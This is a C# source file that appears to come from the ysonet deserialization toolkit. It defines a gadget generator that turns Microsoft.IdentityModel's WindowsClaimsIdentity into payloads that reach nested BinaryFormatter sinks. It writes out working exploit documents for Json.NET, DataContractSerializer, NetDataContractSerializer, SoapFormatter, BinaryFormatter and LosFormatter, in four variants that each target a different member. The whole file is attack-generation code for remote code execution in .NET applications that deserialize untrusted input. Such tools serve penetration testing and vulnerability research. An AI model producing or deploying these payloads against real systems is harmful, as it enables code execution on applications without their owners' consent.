using Microsoft.IdentityModel.Claims;
using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Runtime.Serialization;
using ysonet.Helpers;

namespace ysonet.Generators
{
    public class WindowsClaimsIdentityGenerator : GenericGenerator
    {
        // Discovery facets (category search only): BinaryFormatter sink in
        // Microsoft.IdentityModel WindowsClaimsIdentity, which is not in the default
        // GAC (extra-assembly). All variants share this capability.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.NestedDeserialization)
                .WithRequirements(GadgetRequirement.ExtraAssembly, GadgetRequirement.NetFramework)
                // System.Security.Claims is 4.5+; fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
        }

        // TWO SINKS, ONE TYPE. Microsoft.IdentityModel.Claims.WindowsClaimsIdentity (WIF 3.5)
        // derives from System.Security.Principal.WindowsIdentity, which derives from
        // System.Security.Claims.ClaimsIdentity, and it declares its own ISerializable. So a
        // payload naming it can fire either of two independent nested-BinaryFormatter sinks:
        //
        //  - The mscorlib one. ClaimsIdentity.Deserialize switches on the SerializationInfo
        //    entry NAME and runs an unbindered BinaryFormatter for three of them:
        //    System.Security.ClaimsIdentity.actor, .bootstrapContext and .claims. These fire
        //    inside the BASE constructor, before WindowsIdentity reads its own required
        //    "m_userToken", so the payload needs no other member. Variants 1, 2 and 3.
        //
        //  - The WIF one. WindowsClaimsIdentity's own constructor reads its own "_actor"
        //    member and deserializes it itself, which is a different code path in a different
        //    assembly. That form must also supply m_userToken, _label, _nameClaimType and
        //    _roleClaimType, because the WIF constructor reads them. Variant 4.
        //
        // Variants 1-3 are numbered to match the sibling WindowsIdentity gadget exactly, so
        // the two gadgets on this sink are learnable together: 1 = .actor, 2 =
        // .bootstrapContext, 3 = .claims, on every advertised formatter. Variant 4 is the one
        // thing WindowsIdentity has no equivalent for, so it comes last, and it exists only on
        // the three formatters whose document shape can express its IntPtr member - it says so
        // with Without(...) instead of quietly building something else.
        //
        // NUMBERING CHANGED. Before this was unified, a number meant different members
        // depending on -f: on BinaryFormatter/LosFormatter/NDCS variant 1 was the WIF _actor
        // form and 2/3 were .actor/.bootstrapContext, while on Json.NET/DCS/SoapFormatter
        // variant 1 was .actor, 2 was .bootstrapContext and 3 silently fell through to 1. Every
        // combination fired, so nothing ever failed and nothing flagged it. See
        // docs/usage-and-examples.md for what moved where.
        private int variant_number = 1; // Default

        public override string AdditionalInfo()
        {
            return "Requires Microsoft.IdentityModel.Claims namespace (not default GAC)";
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                // Kept free of long unbroken tokens on purpose: the help wrapper hyphenates a
                // word that does not fit, which would make a member name uncopyable.
                {"var|variant=", "Which member carries the inner BinaryFormatter payload. " +
                    "1, 2 and 3 are the ClaimsIdentity keys, named the same way and numbered the " +
                    "same way as on the WindowsIdentity gadget: they all start with " +
                    "'System.Security.ClaimsIdentity.' and end with 1 = actor (default), " +
                    "2 = bootstrapContext, 3 = claims. 4 is different: it is the WIF type's OWN " +
                    "_actor member, a separate sink inside the WIF assembly rather than in " +
                    "mscorlib, and it exists only on BinaryFormatter, LosFormatter and NDCS. " +
                    "NOTE: what 1-3 build CHANGED when the numbering was unified - it used to " +
                    "depend on the formatter. An unknown number falls back to 1.",
                    v => int.TryParse(v, out variant_number) },
            };

            return options;
        }

        // Variant 4 is the only one that narrows the list. Its document has to carry an
        // m_userToken of type System.IntPtr, which the NetDataContractSerializer form expresses
        // with a nested value element and the two binary formatters carry natively; the
        // self-describing Json.NET, DataContractSerializer and SoapFormatter documents this
        // gadget hand-writes have no shape for it. Declaring it here means GuardVariantFormatter
        // refuses the pair by name instead of falling through to another payload.
        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter (4)", "Json.NET (3)", "DataContractSerializer (3)", "NetDataContractSerializer (4)", "SoapFormatter (3)", "LosFormatter (4)" };
        }

        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override List<GadgetVariant> Variants()
        {
            return new List<GadgetVariant>
            {
                new GadgetVariant(1, "actor member (default)"),
                new GadgetVariant(2, "bootstrapContext member"),
                new GadgetVariant(3, "claims member"),
                new GadgetVariant(4, "WIF _actor member (its own sink; BF/Los/NDCS only)")
                    .Without(Formatters.JsonNet)
                    .Without(Formatters.DataContractSerializer)
                    .Without(Formatters.SoapFormatter)
            };
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Bridged, GadgetTags.NotInGAC };
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        // The three mscorlib member names this gadget can write, in one place, spelled out.
        // Every formatter branch reads the name from here, so the marshal and the four hand
        // written documents can never drift apart or disagree per formatter again. An unknown
        // variant number falls through to the default rather than throwing.
        private string SerializationInfoKeyForVariant()
        {
            if (variant_number == 2) return "System.Security.ClaimsIdentity.bootstrapContext";
            if (variant_number == 3) return "System.Security.ClaimsIdentity.claims";
            return "System.Security.ClaimsIdentity.actor";
        }

        private bool UseWifActorFieldForm()
        {
            return variant_number == 4;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // Variant 4 has no document on three of the six formatters. Refuse that pair by
            // name here rather than letting it fall through to a different member.
            GuardVariantFormatter(variant_number, formatter);

            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                IGenerator generator = new TextFormattingRunPropertiesGenerator();
                binaryFormatterPayload = (byte[])generator.GenerateInner("BinaryFormatter", inputArgs);
            }

            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
            string claimsIdentityKey = SerializationInfoKeyForVariant();

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
            {
                object obj = UseWifActorFieldForm()
                    ? (object)new WindowsClaimsIdentityWifActorFieldMarshal(b64encoded)
                    : new WindowsClaimsIdentityKeyMarshal(claimsIdentityKey, b64encoded);

                return Serialize(obj, formatter, inputArgs);
            }
            else if (formatter.ToLower().Equals("json.net"))
            {
                string payload = @"{
                    '$type': 'Microsoft.IdentityModel.Claims.WindowsClaimsIdentity, Microsoft.IdentityModel,Version=3.5.0.0,PublicKeyToken=31bf3856ad364e35',
                    '" + claimsIdentityKey + @"': '" + b64encoded + @"'
                }";

                if (inputArgs.Minify)
                {

                    if (inputArgs.UseSimpleType)
                    {
                        payload = JsonMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
                    }
                    else
                    {
                        payload = JsonMinifier.Minify(payload, null, null);
                    }
                }


                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {
                string payload = $@"<root type=""Microsoft.IdentityModel.Claims.WindowsClaimsIdentity, Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"">
    <WindowsClaimsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/Microsoft.IdentityModel.Claims"">
      <{claimsIdentityKey} i:type=""x:string"" xmlns="""">{b64encoded}</{claimsIdentityKey}>
       </WindowsClaimsIdentity>
</root>";

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
                    }
                    else
                    {
                        payload = XmlMinifier.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root", "type");
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("netdatacontractserializer"))
            {
                // Variant 4 writes the WIF type's own members, in the order its constructor
                // reads them. m_userToken has to be a real System.IntPtr, which is why it is a
                // nested element rather than a plain value: that shape is the reason variant 4
                // exists on this formatter and not on the three self-describing ones.
                string payload = UseWifActorFieldForm()
                    ? $@"<root>
<w xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" z:Type=""Microsoft.IdentityModel.Claims.WindowsClaimsIdentity"" z:Assembly=""Microsoft.IdentityModel,Version=3.5.0.0,PublicKeyToken=31bf3856ad364e35"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns="""">
  <_actor z:Type=""System.String"" z:Assembly=""0"" >{b64encoded}</_actor>
  <m_userToken z:Type=""System.IntPtr"" z:Assembly=""0"" xmlns="""">
    <value z:Type=""System.Int64"" z:Assembly=""0"">0</value>
  </m_userToken>
  <_label i:nil=""true""/>
  <_nameClaimType i:nil=""true""/>
  <_roleClaimType i:nil=""true""/>
</w>
</root>
"
                    : $@"<root>
<w xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" z:Type=""Microsoft.IdentityModel.Claims.WindowsClaimsIdentity"" z:Assembly=""Microsoft.IdentityModel,Version=3.5.0.0,PublicKeyToken=31bf3856ad364e35"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns="""">
  <{claimsIdentityKey} z:Type=""System.String"" z:Assembly=""0"">{b64encoded}</{claimsIdentityKey}>
</w>
</root>
";

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
                    }
                    else
                    {
                        payload = XmlMinifier.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.NetDataContractSerializer_deserialize(payload, "root");
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("soapformatter"))
            {
                string payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
<SOAP-ENV:Body>
    <a1:WindowsClaimsIdentity id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/Microsoft.IdentityModel.Claims/Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"">
      <{claimsIdentityKey} xsi:type=""xsd:string"" xmlns="""">{b64encoded}</{claimsIdentityKey}>
    </a1:WindowsClaimsIdentity>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
";

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null, FormatterType.SoapFormatter);
                    }
                    else
                    {
                        payload = XmlMinifier.Minify(payload, null, null, FormatterType.SoapFormatter);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.SoapFormatter_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }

    // Variants 1-3: one marshal for all three mscorlib keys, because the emitted object is the
    // same WindowsClaimsIdentity carrying the same single string and only the member NAME
    // changes. Nothing else has to be written: ClaimsIdentity.Deserialize ignores names it does
    // not know, and the WIF and WindowsIdentity constructors read their own required members
    // only after the base constructor - and therefore the inner BinaryFormatter - has run.
    [Serializable]
    public class WindowsClaimsIdentityKeyMarshal : ISerializable
    {
        public WindowsClaimsIdentityKeyMarshal(string claimsIdentityKey, string b64payload)
        {
            ClaimsIdentityKey = claimsIdentityKey;
            B64Payload = b64payload;
        }

        private string ClaimsIdentityKey { get; }

        private string B64Payload { get; }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(WindowsClaimsIdentity));
            info.AddValue(ClaimsIdentityKey, B64Payload);
        }
    }

    // Variant 4: the WIF type's OWN sink. WindowsClaimsIdentity's constructor reads "_actor"
    // and deserializes it itself, so this reaches a BinaryFormatter in Microsoft.IdentityModel
    // rather than the one in mscorlib's ClaimsIdentity.Deserialize. The four companions are not
    // decoration - that constructor reads them, and the ORDER here is the order it reads them
    // in. m_userToken must be a real IntPtr; a zero handle is what keeps the constructor from
    // trying to build a token.
    [Serializable]
    public class WindowsClaimsIdentityWifActorFieldMarshal : ISerializable
    {
        public WindowsClaimsIdentityWifActorFieldMarshal(string b64payload)
        {
            B64Payload = b64payload;
        }

        private string B64Payload { get; }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(WindowsClaimsIdentity));
            info.AddValue("_actor", B64Payload);
            info.AddValue("m_userToken", new IntPtr(0));
            info.AddValue("_label", null);
            info.AddValue("_nameClaimType", null);
            info.AddValue("_roleClaimType", null);
        }
    }
}
